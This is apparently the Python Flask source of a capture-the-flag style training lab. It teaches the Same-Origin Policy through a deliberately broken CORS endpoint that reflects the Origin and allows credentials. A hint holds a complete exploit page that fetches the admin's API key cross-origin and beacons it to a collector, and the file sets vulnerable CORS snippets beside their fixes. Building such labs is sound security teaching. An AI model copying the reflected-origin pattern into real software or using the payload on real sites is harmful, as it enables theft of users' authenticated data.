"""
WildWebApps protection lab - Same-Origin Policy (demonstrated against a CORS leak).

The Same-Origin Policy (SOP) is real here, not simulated: the browser refuses to
let a script on one origin read another origin's response. This lab shows SOP
doing its job, and shows the one CORS mistake that switches it off.

Two origins, one host, split by PORT
-------------------------------------
SOP only means something across origins, so this single app answers on two of them:

  * the BANK (victim app) at     http://127.0.0.1:8000   - the admin is logged in here
  * the ATTACKER console at       http://127.0.0.1:8001   - where you host the exploit

`127.0.0.1:8000` and `127.0.0.1:8001` are a DIFFERENT ORIGIN (the port differs, and an
origin is scheme + host + port), so SOP keeps them apart. But they are the SAME SITE
(a "site" ignores the port), so the bank's `SameSite=Lax` session cookie is still sent
on a request from the console to the bank. That is the exact gap the lab turns on: a
cross-origin read that SOP would normally block, with the victim's cookie riding
along. (Using two ports - not two hostnames like the CSRF lab - is what keeps it
same-site, so no brittle `SameSite=None; Secure` cookie is needed. Everything stays on
loopback and runs offline.)

What SOP does, and the hole that defeats it
-------------------------------------------
The bank serves account data on two endpoints:

  * /api/balance  - a normal endpoint with NO CORS headers. A cross-origin read is
                    blocked by SOP (the fetch rejects with a TypeError). SOP working.
  * /api/profile  - a legacy endpoint with a BROKEN CORS policy: it reflects the
                    request `Origin` into `Access-Control-Allow-Origin` and sets
                    `Access-Control-Allow-Credentials: true`, which tells the browser
                    that ANY site may read its authenticated response. That is the
                    hole, and it returns the admin's API key (the flag).

How the flag is gated behind exploitation
-----------------------------------------
The API key only exists in the admin's session, and that session cookie lives only in
the admin bot's browser - never yours. You cannot read it directly: a cross-origin
read of /api/balance is blocked by SOP, and /api/profile returns no key without the
admin session. To win you must:

  1. write an exploit page that does a credentialed cross-origin fetch to
     /api/profile, reads api_key, and beacons it to your collector (POST /exploit),
  2. deliver it to the logged-in admin bot (POST /deliver). Its browser attaches the
     admin cookie, the broken CORS policy lets your script read the response, and the
     key lands in your collector,
  3. read the captured key and submit it as the flag.

The admin bot is a headless Chromium driven by Playwright. It only ever browses
127.0.0.1.
"""
import os
import threading
import time

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart). It is the
# admin account's API key, leaked through the misconfigured CORS endpoint.
FLAG = vulnlab.generate_flag()

BANK_PORT = int(os.environ.get("BANK_PORT", "8000"))
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", "8001"))
BANK_ORIGIN = f"http://127.0.0.1:{BANK_PORT}"        # victim app (admin logged in here)
ATTACKER_ORIGIN = f"http://127.0.0.1:{ATTACKER_PORT}"  # attacker console / exploit host

# Per-process admin session token. The admin bot's browser carries it as a cookie;
# the attacker never sees it (it is HttpOnly) and does not need to - the browser
# attaches it automatically to the credentialed cross-origin fetch. It is distinct
# from the flag, so even reading the cookie would not hand over the key.
ADMIN_SESSION = vulnlab.generate_flag()

# A scaffold shown in the console textarea. It is deliberately NOT a working exploit:
# completing it (a credentialed cross-origin read of /api/profile that beacons the
# key) is the exercise. The hints contain a full example.
DEFAULT_EXPLOIT = """<!-- SOP / CORS exploit (hosted on your console origin, 127.0.0.1:8001).
     Target:  http://127.0.0.1:8000/api/profile   (reflects Origin, allows credentials)
     Do a credentialed cross-origin fetch, read api_key, and beacon it to /collect.
     See the hints for a complete example. -->
<html>
  <body>
    <script>
      // TODO: fetch the bank's /api/profile with credentials, then send api_key to /collect
    </script>
  </body>
</html>
"""

# Mutable lab state (resets to defaults on restart).
LOOT: list[dict] = []
LOOT_MAX = 50
STATE = {
    "done": False,               # True once a correct key is captured
    "exploit": DEFAULT_EXPLOIT,  # attacker-authored HTML served at /exploit
}


def site() -> str:
    """Which origin is addressed: 'attacker' (port 8001) or 'bank' (port 8000)."""
    host = request.host or ""
    port = host.rsplit(":", 1)[-1] if ":" in host else ""
    return "attacker" if port == str(ATTACKER_PORT) else "bank"


def _signed_in() -> bool:
    return request.cookies.get("session") == ADMIN_SESSION


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(url: str) -> str:
    """
    Open `url` in a headless browser that is "logged in" to the BANK as the admin
    (its context carries the bank session cookie, scoped to host 127.0.0.1 so it is
    sent to both ports). If the page reads the bank cross-origin through the CORS
    hole, the browser attaches that cookie. Returns "" on success or a short error.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The admin's logged-in session at the BANK. The cookie is host-scoped
                # to 127.0.0.1 (cookies ignore the port), so it is also sent to the
                # console origin on :8001 and, crucially, on the credentialed
                # cross-origin fetch from :8001 to :8000. SameSite=Lax is enough
                # because :8001 and :8000 are the SAME SITE - no SameSite=None needed.
                # HttpOnly keeps it out of document.cookie so the read must go through
                # the response body (the CORS hole), not a cookie shortcut.
                ctx.add_cookies([{
                    "name": "session",
                    "value": ADMIN_SESSION,
                    "url": BANK_ORIGIN,
                    "httpOnly": True,
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                page.goto(url, wait_until="load", timeout=8000)
                page.wait_for_timeout(1500)  # let the fetch + beacon complete
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── In-lab code switcher: dangerous CORS (Vulnerable) vs safe CORS (Fixed) ─────
# SOP is enforced by the browser and is not "enabled" in code. What developers
# control is how far they relax it via CORS. "Vulnerable" reflects the request
# Origin and allows credentials (any site can read authenticated responses);
# "Fixed" uses an explicit allowlist of trusted origins.
LANGUAGES = {
    "Python": {
        "vuln": (
            "from flask_cors import CORS\n"
            "# DANGEROUS: with credentials, '*' reflects the caller's Origin,\n"
            "# so ANY site can read authenticated responses.\n"
            "CORS(app, supports_credentials=True, origins='*')"
        ),
        "fixed": (
            "from flask_cors import CORS\n"
            "# SAFE: explicit allowlist of trusted origins.\n"
            "CORS(app, resources={r'/api/*': {'origins': ['https://app.example.com']}},\n"
            "     supports_credentials=True)"
        ),
        "doc": "https://flask-cors.readthedocs.io/en/latest/",
    },
    "JavaScript": {
        "vuln": (
            "const cors = require('cors');\n"
            "// DANGEROUS: origin:true echoes the Origin, with credentials on.\n"
            "app.use(cors({ origin: true, credentials: true }));"
        ),
        "fixed": (
            "const ALLOW = new Set(['https://app.example.com']);\n"
            "app.use(cors({\n"
            "  origin: (o, cb) => cb(null, !o || ALLOW.has(o)),  // allowlist\n"
            "  credentials: true,\n"
            "}));"
        ),
        "doc": "https://expressjs.com/en/resources/middleware/cors.html",
    },
    "TypeScript": {
        "vuln": (
            "import cors from 'cors';\n"
            "// DANGEROUS: reflects any Origin back with credentials enabled.\n"
            "app.use(cors({ origin: true, credentials: true }));"
        ),
        "fixed": (
            "import cors, { CorsOptions } from 'cors';\n"
            "const allow = new Set(['https://app.example.com']);\n"
            "const opts: CorsOptions = {\n"
            "  origin: (o, cb) => cb(null, !o || allow.has(o)), credentials: true,\n"
            "};\n"
            "app.use(cors(opts));"
        ),
        "doc": "https://expressjs.com/en/resources/middleware/cors.html",
    },
    "PHP": {
        "vuln": (
            "// DANGEROUS: reflects the caller's Origin and allows credentials.\n"
            "header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);\n"
            "header('Access-Control-Allow-Credentials: true');"
        ),
        "fixed": (
            "$allow = ['https://app.example.com'];\n"
            "$o = $_SERVER['HTTP_ORIGIN'] ?? '';\n"
            "if (in_array($o, $allow, true)) {           // explicit allowlist\n"
            "    header(\"Access-Control-Allow-Origin: $o\");\n"
            "    header('Access-Control-Allow-Credentials: true');\n"
            "}"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS",
    },
    "Java": {
        "vuln": (
            "// DANGEROUS: '*' pattern reflects the Origin, paired with credentials.\n"
            "config.addAllowedOriginPattern(\"*\");\n"
            "config.setAllowCredentials(true);"
        ),
        "fixed": (
            "// SAFE: explicit origins; credentials only for those.\n"
            "config.setAllowedOrigins(List.of(\"https://app.example.com\"));\n"
            "config.setAllowCredentials(true);"
        ),
        "doc": "https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html",
    },
    "Ruby": {
        "vuln": (
            "# DANGEROUS: the regex matches every Origin, with credentials.\n"
            "allow do\n"
            "  origins(/.*/)\n"
            "  resource '*', headers: :any, credentials: true\n"
            "end"
        ),
        "fixed": (
            "allow do\n"
            "  origins 'https://app.example.com'        # explicit allowlist\n"
            "  resource '/api/*', headers: :any, credentials: true\n"
            "end"
        ),
        "doc": "https://github.com/cyu/rack-cors",
    },
    "Go": {
        "vuln": (
            "// DANGEROUS: AllowOriginFunc returns true for everything, credentials on.\n"
            "c := cors.New(cors.Options{\n"
            "    AllowOriginFunc:  func(o string) bool { return true },\n"
            "    AllowCredentials: true,\n"
            "})"
        ),
        "fixed": (
            "c := cors.New(cors.Options{\n"
            "    AllowedOrigins:   []string{\"https://app.example.com\"},\n"
            "    AllowCredentials: true,\n"
            "})"
        ),
        "doc": "https://github.com/rs/cors",
    },
    "C#": {
        "vuln": (
            "// DANGEROUS: reflect any origin and allow credentials.\n"
            "policy.SetIsOriginAllowed(_ => true)\n"
            "      .AllowAnyHeader().AllowCredentials();"
        ),
        "fixed": (
            "policy.WithOrigins(\"https://app.example.com\")   // explicit allowlist\n"
            "      .AllowAnyHeader().AllowCredentials();"
        ),
        "doc": "https://learn.microsoft.com/en-us/aspnet/core/security/cors",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Same-Origin Policy - WildBank",
    owasp="Defense: Same-Origin Policy (browser-enforced origin isolation)",
    summary=(
        "WildBank answers on two origins split by port: the bank at :8000 and your "
        "console at :8001. They are different origins, so the Same-Origin Policy "
        "blocks a cross-origin script from reading the bank's responses - the easy "
        "theft fails. But the legacy /api/profile has a broken CORS policy that "
        "reflects the Origin and allows credentials. You hold no admin session; the "
        "logged-in admin bot opens any page you host. Make the admin's own browser "
        "read the API key for you through that CORS hole, and the flag appears."
    ),
    instructions=[
        "Two origins, one host: the bank is http://127.0.0.1:8000 and this console "
        "is http://127.0.0.1:8001. A different port is a different ORIGIN (so SOP "
        "applies), but the same SITE (so the bank's SameSite=Lax cookie still rides "
        "a request between them).",
        "Use 'Try a cross-origin read' below. Reading /api/balance is blocked by the "
        "Same-Origin Policy (a TypeError). Reading the legacy /api/profile succeeds, "
        "but with no admin session it returns no key. That is SOP, and the CORS hole.",
        "You have no admin session, so you cannot read the key yourself. The "
        "logged-in admin bot, however, opens any page you host on this console origin.",
        "Write an exploit that does a credentialed cross-origin fetch to "
        "http://127.0.0.1:8000/api/profile, reads api_key, and beacons it to /collect "
        "on this origin. Store it, then Deliver to admin.",
        "The bot's browser attaches the admin cookie, the broken CORS policy lets "
        "your script read the response, and the API key lands in your collector. "
        "Submit it as the flag.",
    ],
    hints=[
        "See SOP both block and allow a read. /api/balance sends no CORS headers, so "
        "the browser refuses to let a cross-origin script read it (TypeError). "
        "/api/profile reflects your Origin and allows credentials, so the read is "
        "permitted - it just has no key to give you without the admin's session.",
        "Paste this as your exploit page, then Store + Deliver to admin:  "
        "<html><body><script>"
        "fetch('http://127.0.0.1:8000/api/profile',{credentials:'include'})"
        ".then(r=>r.json()).then(d=>{new Image().src="
        "'/collect?c='+encodeURIComponent(d.api_key)})"
        "</script></body></html>",
        "Why it works: :8001 and :8000 are the same site (host 127.0.0.1), so the "
        "admin's SameSite=Lax cookie is sent on the credentialed fetch; they are "
        "different origins, so SOP would normally block the read - but the "
        "reflected-Origin-plus-credentials CORS policy on /api/profile overrides "
        "that. You never see the cookie; the browser sends it for you.",
        "Lesson and fix: SOP is the default that keeps origins apart. The only reason "
        "this read works is the broken CORS policy. Replace the reflected Origin with "
        "an explicit allowlist, never pair credentials with a wildcard or reflected "
        "origin, and remember that an XSS running inside the origin defeats SOP "
        "entirely.",
    ],
    languages=LANGUAGES,
    references=[
        ("MDN - Same-origin policy", "https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy"),
        ("MDN - Cross-Origin Resource Sharing (CORS)", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS"),
        ("OWASP - CORS misconfiguration", "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"),
        ("PortSwigger - CORS", "https://portswigger.net/web-security/cors"),
    ],
)


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    if site() == "attacker":
        # The attacker console: cross-origin tester, exploit hosting, collector, flag.
        return render_template(
            "index.html",
            bank_url=BANK_ORIGIN,
            console_url=ATTACKER_ORIGIN,
            exploit_html=STATE["exploit"],
            solved=STATE["done"],
            flag=(FLAG if STATE["done"] else ""),
            loot=list(reversed(LOOT)),
            err=request.args.get("err", ""),
            **CONTEXT,
        )
    # The bank (victim app) the admin is logged into.
    return render_template(
        "bank.html",
        signed_in=_signed_in(),
        console_url=ATTACKER_ORIGIN,
        bank_url=BANK_ORIGIN,
    )


@app.route("/api/balance")
def api_balance():
    # A normal bank endpoint. It sends NO Access-Control-Allow-Origin header, so the
    # browser blocks any cross-origin script from reading the response: SOP working.
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/balance")
    if not _signed_in():
        return jsonify(error="unauthorized"), 401
    return jsonify(account="WildBank Checking", balance="12,480.55 USD")


@app.route("/api/profile")
def api_profile():
    # === THE CORS HOLE ======================================================
    # A legacy endpoint that REFLECTS the request Origin into
    # Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true.
    # That tells the browser ANY origin may read this authenticated response,
    # which switches off the protection the Same-Origin Policy would give. With
    # the admin session cookie attached, it returns the API key (the flag).
    # ========================================================================
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/profile")
    signed_in = _signed_in()
    resp = jsonify(
        user=("admin" if signed_in else None),
        api_key=(FLAG if signed_in else None),
    )
    origin = request.headers.get("Origin")
    if origin:
        resp.headers["Access-Control-Allow-Origin"] = origin   # reflected (misconfig)
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Vary"] = "Origin"
    return resp


@app.post("/exploit")
def save_exploit():
    """Attacker hosting: store the exploit HTML (served from the console origin)."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/")
    STATE["exploit"] = request.form.get("html", "")
    return redirect(ATTACKER_ORIGIN + "/")


@app.get("/exploit")
def serve_exploit():
    """Serve the attacker's page from the console origin (127.0.0.1:8001)."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/exploit")
    return Response(STATE["exploit"], mimetype="text/html")


@app.post("/deliver")
def deliver():
    """Have the logged-in admin bot open the hosted exploit page."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/")
    err = admin_visit(ATTACKER_ORIGIN + "/exploit")
    return redirect(url_for("index", err=err) if err else url_for("index"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. The injected script beacons the stolen key here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
        if vulnlab.check_flag(FLAG, data):
            STATE["done"] = True
    # A 1x1 transparent GIF, so `new Image().src=...` beacons cleanly.
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.post("/check")
def check():
    return jsonify(correct=vulnlab.check_flag(FLAG, request.form.get("flag", "")))


def _run(port: int):
    from werkzeug.serving import make_server
    host = os.environ.get("HOST", "127.0.0.1")
    # threaded=True so the admin bot's inbound requests (the exploit page, the
    # cross-origin /api/profile read, and the /collect beacon) are served while the
    # /deliver request that launched the bot is still open.
    make_server(host, port, app, threaded=True).serve_forever()


if __name__ == "__main__":
    # One Flask app, two origins: serve the attacker console on its port in a
    # background thread and the bank on the main thread.
    threading.Thread(target=_run, args=(ATTACKER_PORT,), daemon=True).start()
    _run(BANK_PORT)
